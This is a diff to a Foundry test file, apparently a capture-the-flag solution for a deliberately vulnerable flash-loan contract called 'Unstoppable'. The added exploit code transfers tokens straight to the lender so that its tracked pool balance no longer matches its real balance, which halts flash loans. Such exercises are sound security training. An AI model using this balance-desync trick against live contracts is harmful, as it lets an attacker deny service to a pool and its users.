@@ -47,9 +47,7 @@ contract Unstoppable is Test {
 
         // Show it's possible for someUser to take out a flash loan
         vm.startPrank(someUser);
-        receiverUnstoppable = new ReceiverUnstoppable(
-            address(unstoppableLender)
-        );
+        receiverUnstoppable = new ReceiverUnstoppable(address(unstoppableLender));
         vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
         receiverUnstoppable.executeFlashLoan(10);
         vm.stopPrank();
@@ -60,6 +58,14 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        // attacker deposits tokens into the pool
+        // poolBalance is updated only when deposit() is called
+        // as a result, if attacker transfers tokens directly to the pool
+        // poolBalance will not be updated
+        // poolBalance != balanceBefore, and emit AssertionViolated
+        dvt.transfer(address(unstoppableLender), 100e18);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
